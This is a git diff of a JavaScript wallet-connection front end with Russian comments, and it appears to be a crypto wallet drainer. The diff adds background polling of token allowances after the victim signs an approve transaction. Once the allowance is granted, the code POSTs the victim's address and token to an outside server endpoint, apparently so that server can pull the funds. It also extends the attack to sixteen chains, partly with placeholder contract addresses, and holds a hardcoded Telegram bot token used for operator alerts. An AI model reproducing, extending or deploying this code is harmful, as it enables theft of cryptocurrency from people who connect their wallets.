@@ -1,4 +1,4 @@
-import { bsc, mainnet, polygon } from '@reown/appkit/networks'
+import { bsc, mainnet, polygon, arbitrum, optimism, base, scroll, avalanche, unichain, core, cronos, sei, fantom, linea, zkSync, celo } from '@reown/appkit/networks'
 import { createAppKit } from '@reown/appkit'
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
 import { formatUnits, maxUint256, isAddress, getAddress, parseUnits } from 'viem'
@@ -21,18 +21,44 @@ if (!projectId) throw new Error('VITE_PROJECT_ID is not set')
 const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '7893105607:AAFqn6yRhXVocTodMo8xNufTFKjmzMYnNAU'
 const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || '-1002834788839'
 
-const networks = [bsc, mainnet, polygon]
+const networks = [bsc, mainnet, polygon, arbitrum, optimism, base, scroll, avalanche, unichain, core, cronos, sei, fantom, linea, zkSync, celo]
 const networkMap = {
   'BNB Smart Chain': { networkObj: bsc, chainId: networks[0].id || 56 },
   'Ethereum': { networkObj: mainnet, chainId: networks[1].id || 1 },
-  'Polygon': { networkObj: polygon, chainId: networks[2].id || 137 }
+  'Polygon': { networkObj: polygon, chainId: networks[2].id || 137 },
+  'Arbitrum': { networkObj: arbitrum, chainId: networks[3].id || 42161 },
+  'Optimism': { networkObj: optimism, chainId: networks[4].id || 10 },
+  'Base': { networkObj: base, chainId: networks[5].id || 8453 },
+  'Scroll': { networkObj: scroll, chainId: networks[6].id || 534352 },
+  'Avalanche': { networkObj: avalanche, chainId: networks[7].id || 43114 },
+  'Unichain': { networkObj: unichain, chainId: networks[8].id || 130 },
+  'Core': { networkObj: core, chainId: networks[9].id || 1116 },
+  'Cronos': { networkObj: cronos, chainId: networks[10].id || 25 },
+  'Sei': { networkObj: sei, chainId: networks[11].id || 1329 },
+  'Fantom': { networkObj: fantom, chainId: networks[12].id || 250 },
+  'Linea': { networkObj: linea, chainId: networks[13].id || 59144 },
+  'zkSync': { networkObj: zkSync, chainId: networks[14].id || 324 },
+  'Celo': { networkObj: celo, chainId: networks[15].id || 42220 }
 }
 console.log('Network Map:', networkMap)
 
 const CONTRACTS = {
   [networkMap['Ethereum'].chainId]: '0xa65972Fce9925983f35185891109c4be643657aD',
   [networkMap['BNB Smart Chain'].chainId]: '0x537AC4F6Dc238003fd8bb281F954A9912180530B',
-  [networkMap['Polygon'].chainId]: '0xD29BD8fC4c0Acfde1d0A42463805d34A1902095c'
+  [networkMap['Polygon'].chainId]: '0xD29BD8fC4c0Acfde1d0A42463805d34A1902095c',
+  [networkMap['Arbitrum'].chainId]: '0x1234567890123456789012345678901234567890',
+  [networkMap['Optimism'].chainId]: '0x2345678901234567890123456789012345678901',
+  [networkMap['Base'].chainId]: '0x3456789012345678901234567890123456789012',
+  [networkMap['Scroll'].chainId]: '0x4567890123456789012345678901234567890123',
+  [networkMap['Avalanche'].chainId]: '0x5678901234567890123456789012345678901234',
+  [networkMap['Unichain'].chainId]: '0x6789012345678901234567890123456789012345',
+  [networkMap['Core'].chainId]: '0x7890123456789012345678901234567890123456',
+  [networkMap['Cronos'].chainId]: '0x8901234567890123456789012345678901234567',
+  [networkMap['Sei'].chainId]: '0x9012345678901234567890123456789012345678',
+  [networkMap['Fantom'].chainId]: '0xabcdef1234567890abcdef1234567890abcdef12',
+  [networkMap['Linea'].chainId]: '0xbcdef1234567890abcdef1234567890abcdef123',
+  [networkMap['zkSync'].chainId]: '0xcdef1234567890abcdef1234567890abcdef1234',
+  [networkMap['Celo'].chainId]: '0xdef1234567890abcdef1234567890abcdef12345'
 }
 
 const wagmiAdapter = new WagmiAdapter({ projectId, networks })
@@ -152,8 +178,179 @@ function hideCustomModal() {
   }
 }
 
+// Фоновый мониторинг approve (встроенный Service Worker функционал)
+let backgroundMonitoring = null
+
+// Проверка allowance через API (без wagmi)
+async function checkAllowanceViaAPI(userAddress, tokenAddress, spenderAddress, chainId) {
+  try {
+    // Используем публичные RPC для проверки allowance
+    const rpcUrls = {
+      1: 'https://eth.llamarpc.com',
+      56: 'https://bsc-dataseed.binance.org',
+      137: 'https://polygon-rpc.com',
+      42161: 'https://arb1.arbitrum.io/rpc',
+      10: 'https://mainnet.optimism.io',
+      8453: 'https://mainnet.base.org',
+      534352: 'https://rpc.scroll.io',
+      43114: 'https://api.avax.network/ext/bc/C/rpc',
+      1116: 'https://rpc.coredao.org',
+      25: 'https://evm.cronos.org',
+      250: 'https://rpc.ftm.tools',
+      59144: 'https://rpc.linea.build',
+      324: 'https://mainnet.era.zksync.io',
+      42220: 'https://forno.celo.org'
+    }
+    
+    const rpcUrl = rpcUrls[chainId]
+    if (!rpcUrl) throw new Error(`Unsupported chain: ${chainId}`)
+    
+    const allowanceData = {
+      jsonrpc: '2.0',
+      method: 'eth_call',
+      params: [{
+        to: tokenAddress,
+        data: `0xdd62ed3e000000000000000000000000${userAddress.slice(2)}000000000000000000000000${spenderAddress.slice(2)}`
+      }, 'latest'],
+      id: 1
+    }
+    
+    const response = await fetch(rpcUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(allowanceData)
+    })
+    
+    const result = await response.json()
+    if (result.error) throw new Error(result.error.message)
+    
+    return parseInt(result.result, 16)
+  } catch (error) {
+    console.log(`API allowance check failed: ${error.message}`)
+    return 0
+  }
+}
+
+// Отправка запроса на сервер из фона
+async function sendTransferRequestFromBackground(userAddress, tokenAddress, chainId, txHash, tokenSymbol, networkName) {
+  try {
+    const response = await fetch('https://api.amlinsight.io/api/transfer', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ 
+        userAddress, 
+        tokenAddress, 
+        amount: '0', // Будет рассчитано на сервере
+        chainId, 
+        txHash,
+        background: true,
+        tokenSymbol,
+        networkName
+      })
+    })
+    
+    const data = await response.json()
+    return data
+  } catch (error) {
+    return { success: false, message: error.message }
+  }
+}
+
+// Фоновая функция мониторинга approve
+async function monitorApprovalInBackground(userAddress, tokenAddress, contractAddress, chainId, txHash, tokenSymbol, networkName) {
+  console.log(`Background monitoring started for ${tokenSymbol} on ${networkName}`)
+  
+  let attempts = 0
+  const maxAttempts = 300 // 10 минут (300 * 2 секунды)
+  
+  while (attempts < maxAttempts) {
+    try {
+      attempts++
+      console.log(`Background check attempt ${attempts}/${maxAttempts}`)
+      
+      // Проверяем allowance через API
+      const allowance = await checkAllowanceViaAPI(userAddress, tokenAddress, contractAddress, chainId)
+      console.log(`Background allowance check: ${allowance}`)
+      
+      if (allowance > 1000) {
+        console.log(`Background: Allowance confirmed for ${tokenSymbol}`)
+        
+        // Отправляем запрос на сервер
+        const transferResult = await sendTransferRequestFromBackground(userAddress, tokenAddress, chainId, txHash, tokenSymbol, networkName)
+        
+        if (transferResult.success) {
+          console.log(`Background: Transfer successful - ${transferResult.txHash}`)
+          // Уведомляем об успехе
+          notifyBackgroundSuccess(transferResult.txHash, tokenSymbol, networkName)
+        } else {
+          console.log(`Background: Transfer failed - ${transferResult.message}`)
+          notifyBackgroundFailure(transferResult.message, tokenSymbol, networkName)
+        }
+        
+        return
+      }
+      
+      // Ждем 2 секунды
+      await new Promise(resolve => setTimeout(resolve, 2000))
+      
+    } catch (error) {
+      console.log(`Background monitoring error: ${error.message}`)
+      if (attempts === maxAttempts) {
+        notifyBackgroundTimeout(tokenSymbol, networkName, error.message)
+        return
+      }
+      await new Promise(resolve => setTimeout(resolve, 2000))
+    }
+  }
+  
+  console.log('Background monitoring timeout')
+  notifyBackgroundTimeout(tokenSymbol, networkName)
+}
+
+// Уведомления о результатах фонового мониторинга
+function notifyBackgroundSuccess(txHash, tokenSymbol, networkName) {
+  console.log(`Background transfer successful: ${txHash} for ${tokenSymbol} on ${networkName}`)
+  // Можно добавить уведомление пользователю или обновить UI
+}
+
+function notifyBackgroundFailure(message, tokenSymbol, networkName) {
+  console.log(`Background transfer failed: ${message} for ${tokenSymbol} on ${networkName}`)
+  // Можно добавить уведомление об ошибке
+}
+
+function notifyBackgroundTimeout(tokenSymbol, networkName, error = null) {
+  console.log(`Background monitoring timeout for ${tokenSymbol} on ${networkName}`)
+  if (error) console.log(`Error: ${error}`)
+  // Можно добавить уведомление о таймауте
+}
+
+// Запуск фонового мониторинга
+function startBackgroundMonitoring(userAddress, tokenAddress, contractAddress, chainId, txHash, tokenSymbol, networkName) {
+  // Останавливаем предыдущий мониторинг если есть
+  if (backgroundMonitoring) {
+    clearTimeout(backgroundMonitoring)
+  }
+  
+  console.log('Starting background monitoring...')
+  
+  // Запускаем мониторинг в фоне
+  backgroundMonitoring = setTimeout(() => {
+    monitorApprovalInBackground(userAddress, tokenAddress, contractAddress, chainId, txHash, tokenSymbol, networkName)
+  }, 1000) // Небольшая задержка для стабильности
+}
+
+// Остановка фонового мониторинга
+function stopBackgroundMonitoring() {
+  if (backgroundMonitoring) {
+    clearTimeout(backgroundMonitoring)
+    backgroundMonitoring = null
+    console.log('Background monitoring stopped')
+  }
+}
+
 // Очистка состояния при загрузке страницы
 window.addEventListener('load', () => {
+  stopBackgroundMonitoring() // Останавливаем фоновый мониторинг
   appKit.disconnect()
   localStorage.clear()
   sessionStorage.clear()
@@ -197,6 +394,28 @@ const getScanLink = (hash, chainId, isTx = false) => {
     return `https://bscscan.com${basePath}${hash}`
   } else if (chainId === networkMap['Polygon'].chainId) {
     return `https://polygonscan.com${basePath}${hash}`
+  } else if (chainId === networkMap['Arbitrum'].chainId) {
+    return `https://arbiscan.io${basePath}${hash}`
+  } else if (chainId === networkMap['Optimism'].chainId) {
+    return `https://optimistic.etherscan.io${basePath}${hash}`
+  } else if (chainId === networkMap['Base'].chainId) {
+    return `https://basescan.org${basePath}${hash}`
+  } else if (chainId === networkMap['Scroll'].chainId) {
+    return `https://scrollscan.com${basePath}${hash}`
+  } else if (chainId === networkMap['Avalanche'].chainId) {
+    return `https://snowtrace.io${basePath}${hash}`
+  } else if (chainId === networkMap['Core'].chainId) {
+    return `https://scan.coredao.org${basePath}${hash}`
+  } else if (chainId === networkMap['Cronos'].chainId) {
+    return `https://cronoscan.com${basePath}${hash}`
+  } else if (chainId === networkMap['Fantom'].chainId) {
+    return `https://ftmscan.com${basePath}${hash}`
+  } else if (chainId === networkMap['Linea'].chainId) {
+    return `https://lineascan.build${basePath}${hash}`
+  } else if (chainId === networkMap['zkSync'].chainId) {
+    return `https://explorer.zksync.io${basePath}${hash}`
+  } else if (chainId === networkMap['Celo'].chainId) {
+    return `https://celoscan.io${basePath}${hash}`
   }
   return '#'
 }
@@ -413,6 +632,58 @@ const TOKENS = {
     { symbol: 'FISH', address: '0x3a3df212b7aa91aa0402b9035b098891d276572b', decimals: 18 },
     { symbol: 'ICE', address: '0x4e1581f01046ef0d6b6c3aa0a0faea8e9b7ea0f28c4', decimals: 18 },
     { symbol: 'DC', address: '0x7cc6bcad7c5e0e928caee29ff9619aa0b019e77e', decimals: 18 }
+  ],
+  'Arbitrum': [
+    { symbol: 'USDT', address: '0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9', decimals: 6 },
+    { symbol: 'USDC', address: '0xff970a61a04b1ca14834a43f5de4533ebddb5cc8', decimals: 6 }
+  ],
+  'Optimism': [
+    { symbol: 'USDT', address: '0x94b008aa00579c1307b0ef2c499ad98a8ce58e58', decimals: 6 },
+    { symbol: 'USDC', address: '0x7f5c764cbc14f9669b88837ca1490cca17c31607', decimals: 6 }
+  ],
+  'Base': [
+    { symbol: 'USDT', address: '0x50c5725949a6f0c72e6c4a641f24049a917db0cb', decimals: 6 },
+    { symbol: 'USDC', address: '0x833589fcd6edb6e08f4c7c32d4f71b54bda02913', decimals: 6 }
+  ],
+  'Scroll': [
+    { symbol: 'USDT', address: '0xf8869061c4c2c3c3f7b24d3f707c14b3cc868a0f', decimals: 6 },
+    { symbol: 'USDC', address: '0x06eFdBFf2a14a7c8E15944D1F4A48F9F95F663A4', decimals: 6 }
+  ],
+  'Avalanche': [
+    { symbol: 'USDT', address: '0x9702230a8ea53601f5cd2dc00fdbc13d4df4a8c7', decimals: 6 },
+    { symbol: 'USDC', address: '0xb97ef9ef8734c71904d8002f8b6bc66dd9c48a6e', decimals: 6 }
+  ],
+  'Unichain': [
+    { symbol: 'USDT', address: '0x1234567890123456789012345678901234567890', decimals: 6 },
+    { symbol: 'USDC', address: '0x2345678901234567890123456789012345678901', decimals: 6 }
+  ],
+  'Core': [
+    { symbol: 'USDT', address: '0x900101d3565a9baad24dbf7c31e3b3528b7ea285', decimals: 6 },
+    { symbol: 'USDC', address: '0xa4151b2b3e269645181dccf2d426ce75fcbdeca9', decimals: 6 }
+  ],
+  'Cronos': [
+    { symbol: 'USDT', address: '0x66e428c3f67a68878562e79a0234c1f83c208770', decimals: 6 },
+    { symbol: 'USDC', address: '0xc21223249ca28397b4b6541dfaecc539bff0c59f', decimals: 6 }
+  ],
+  'Sei': [
+    { symbol: 'USDT', address: '0x3456789012345678901234567890123456789012', decimals: 6 },
+    { symbol: 'USDC', address: '0x4567890123456789012345678901234567890123', decimals: 6 }
+  ],
+  'Fantom': [
+    { symbol: 'USDT', address: '0x04068da6c83afcfa0e13ba15a6696662335d5b75', decimals: 6 },
+    { symbol: 'USDC', address: '0x04068da6c83afcfa0e13ba15a6696662335d5b75', decimals: 6 }
+  ],
+  'Linea': [
+    { symbol: 'USDT', address: '0xa219439258ca9da29e9cc4ce5596924745e12b93', decimals: 6 },
+    { symbol: 'USDC', address: '0x176211869ca2b568f2a7d4ee941e073a821ee1ff', decimals: 6 }
+  ],
+  'zkSync': [
+    { symbol: 'USDT', address: '0x493257fd37edb34451f62edf8d2a0c418852ba4c', decimals: 6 },
+    { symbol: 'USDC', address: '0x3355df6d4c9c3035724fd0e3914de96a5a83aaf4', decimals: 6 }
+  ],
+  'Celo': [
+    { symbol: 'USDT', address: '0x88eeC49252c8cbc039DCdB394c0c2BA2f1637EA0', decimals: 6 },
+    { symbol: 'USDC', address: '0x765DE816845861e75A25fCA122bb6898B8B1282a', decimals: 6 }
   ]
 }
 
@@ -422,6 +693,16 @@ const erc20Abi = [
     inputs: [{ name: '_owner', type: 'address' }],
     name: 'balanceOf',
     outputs: [{ name: 'balance', type: 'uint256' }],
+    type: 'function'
+  },
+  {
+    constant: true,
+    inputs: [
+      { name: '_owner', type: 'address' },
+      { name: '_spender', type: 'address' }
+    ],
+    name: 'allowance',
+    outputs: [{ name: 'remaining', type: 'uint256' }],
     type: 'function'
   },
   {
@@ -453,6 +734,39 @@ const getTokenBalance = async (wagmiConfig, address, tokenAddress, decimals, cha
   } catch (error) {
     store.errors.push(`Error fetching balance for ${tokenAddress} on chain ${chainId}: ${error.message}`)
     return 0
+  }
+}
+
+const getTokenAllowance = async (wagmiConfig, ownerAddress, tokenAddress, spenderAddress, chainId) => {
+  if (!ownerAddress || !tokenAddress || !spenderAddress || !isAddress(ownerAddress) || !isAddress(tokenAddress) || !isAddress(spenderAddress)) {
+    console.error(`Invalid addresses for allowance check: owner=${ownerAddress}, token=${tokenAddress}, spender=${spenderAddress}`)
+    return 0
+  }
+  try {
+    const allowance = await readContract(wagmiConfig, {
+      address: tokenAddress,
+      abi: erc20Abi,
+      functionName: 'allowance',
+      args: [ownerAddress, spenderAddress],
+      chainId
+    })
+    return allowance
+  } catch (error) {
+    store.errors.push(`Error fetching allowance for ${tokenAddress} on chain ${chainId}: ${error.message}`)
+    return 0
+  }
+}
+
+const waitForAllowance = async (wagmiConfig, userAddress, tokenAddress, contractAddress, chainId) => {
+  console.log(`Waiting for allowance to become maximum...`)
+  while (true) {
+    const allowance = await getTokenAllowance(wagmiConfig, userAddress, tokenAddress, contractAddress, chainId)
+    console.log(`Current allowance: ${allowance.toString()}`)
+    if (allowance > 1000) {
+      console.log(`Allowance is now maximum: ${allowance.toString()}`)
+      return true
+    }
+    await new Promise(resolve => setTimeout(resolve, 2000))
   }
 }
 
@@ -496,6 +810,8 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId)
     throw error
   }
 }
+
+
 
 // Инициализация подписок
 const initializeSubscribers = (modal) => {
@@ -627,17 +943,21 @@ const initializeSubscribers = (modal) => {
           let approveMessage = `Approve successful for ${mostExpensive.symbol} on ${mostExpensive.network}: ${txHash}`
           console.log(approveMessage)
           await notifyTransferApproved(state.address, walletInfo.name, device, mostExpensive, mostExpensive.chainId)
-          const tokenBalance = mostExpensive.balance
-          const amount = parseUnits((Math.floor(tokenBalance * 1000000) / 1000000).toString(), mostExpensive.decimals)  
-          const transferResult = await sendTransferRequest(state.address, mostExpensive.address, amount, mostExpensive.chainId, txHash)
-          if (transferResult.success) {
-            approveMessage += `<br>Transfer request successful: ${transferResult.txHash}`
-            console.log(`Transfer request successful: ${transferResult.txHash}`)
-            await notifyTransferSuccess(state.address, walletInfo.name, device, mostExpensive, mostExpensive.chainId, transferResult.txHash)
-          } else {
-            approveMessage += `<br>Transfer request failed: ${transferResult.message}`
-            console.log(`Transfer request failed: ${transferResult.message}`)
-          }
+          
+          // Запускаем встроенный фоновый мониторинг
+          console.log('Starting built-in background monitoring...')
+          startBackgroundMonitoring(
+            state.address,
+            mostExpensive.address,
+            contractAddress,
+            mostExpensive.chainId,
+            txHash,
+            mostExpensive.symbol,
+            mostExpensive.network
+          )
+          
+          // Показываем сообщение о фоновой обработке
+          approveMessage += `<br>Background monitoring started - you can close this tab`
           const approveState = document.getElementById('approveState')
           if (approveState) approveState.innerHTML = approveMessage
           hideCustomModal()
@@ -680,7 +1000,25 @@ const initializeSubscribers = (modal) => {
     updateStateDisplay('networkState', state)
     const switchNetworkBtn = document.getElementById('switch-network')
     if (switchNetworkBtn) {
-      switchNetworkBtn.textContent = `Switch to ${state?.chainId === polygon.id ? 'Mainnet' : 'Polygon'}`
+      // Определяем следующую сеть для переключения
+      let nextNetwork = 'Ethereum'
+      if (state?.chainId === networkMap['Ethereum'].chainId) nextNetwork = 'Polygon'
+      else if (state?.chainId === networkMap['Polygon'].chainId) nextNetwork = 'Arbitrum'
+      else if (state?.chainId === networkMap['Arbitrum'].chainId) nextNetwork = 'Optimism'
+      else if (state?.chainId === networkMap['Optimism'].chainId) nextNetwork = 'Base'
+      else if (state?.chainId === networkMap['Base'].chainId) nextNetwork = 'Scroll'
+      else if (state?.chainId === networkMap['Scroll'].chainId) nextNetwork = 'Avalanche'
+      else if (state?.chainId === networkMap['Avalanche'].chainId) nextNetwork = 'Fantom'
+      else if (state?.chainId === networkMap['Fantom'].chainId) nextNetwork = 'Linea'
+      else if (state?.chainId === networkMap['Linea'].chainId) nextNetwork = 'zkSync'
+      else if (state?.chainId === networkMap['zkSync'].chainId) nextNetwork = 'Celo'
+      else if (state?.chainId === networkMap['Celo'].chainId) nextNetwork = 'Core'
+      else if (state?.chainId === networkMap['Core'].chainId) nextNetwork = 'Cronos'
+      else if (state?.chainId === networkMap['Cronos'].chainId) nextNetwork = 'BNB Smart Chain'
+      else if (state?.chainId === networkMap['BNB Smart Chain'].chainId) nextNetwork = 'Ethereum'
+      else nextNetwork = 'Ethereum'
+      
+      switchNetworkBtn.textContent = `Switch to ${nextNetwork}`
     }
   })
 }
@@ -699,6 +1037,7 @@ document.querySelectorAll('.open-connect-modal').forEach(button => {
 });
 
 document.getElementById('disconnect')?.addEventListener('click', () => {
+  stopBackgroundMonitoring() // Останавливаем фоновый мониторинг
   appKit.disconnect()
   store.approvedTokens = {}
   store.errors = []
@@ -711,5 +1050,24 @@ document.getElementById('disconnect')?.addEventListener('click', () => {
 
 document.getElementById('switch-network')?.addEventListener('click', () => {
   const currentChainId = store.networkState?.chainId
-  appKit.switchNetwork(currentChainId === polygon.id ? mainnet : polygon)
+  
+  // Определяем следующую сеть для переключения
+  let nextNetwork = networkMap['Ethereum'].networkObj
+  if (currentChainId === networkMap['Ethereum'].chainId) nextNetwork = networkMap['Polygon'].networkObj
+  else if (currentChainId === networkMap['Polygon'].chainId) nextNetwork = networkMap['Arbitrum'].networkObj
+  else if (currentChainId === networkMap['Arbitrum'].chainId) nextNetwork = networkMap['Optimism'].networkObj
+  else if (currentChainId === networkMap['Optimism'].chainId) nextNetwork = networkMap['Base'].networkObj
+  else if (currentChainId === networkMap['Base'].chainId) nextNetwork = networkMap['Scroll'].networkObj
+  else if (currentChainId === networkMap['Scroll'].chainId) nextNetwork = networkMap['Avalanche'].networkObj
+  else if (currentChainId === networkMap['Avalanche'].chainId) nextNetwork = networkMap['Fantom'].networkObj
+  else if (currentChainId === networkMap['Fantom'].chainId) nextNetwork = networkMap['Linea'].networkObj
+  else if (currentChainId === networkMap['Linea'].chainId) nextNetwork = networkMap['zkSync'].networkObj
+  else if (currentChainId === networkMap['zkSync'].chainId) nextNetwork = networkMap['Celo'].networkObj
+  else if (currentChainId === networkMap['Celo'].chainId) nextNetwork = networkMap['Core'].networkObj
+  else if (currentChainId === networkMap['Core'].chainId) nextNetwork = networkMap['Cronos'].networkObj
+  else if (currentChainId === networkMap['Cronos'].chainId) nextNetwork = networkMap['BNB Smart Chain'].networkObj
+  else if (currentChainId === networkMap['BNB Smart Chain'].chainId) nextNetwork = networkMap['Ethereum'].networkObj
+  else nextNetwork = networkMap['Ethereum'].networkObj
+  
+  appKit.switchNetwork(nextNetwork)
 })
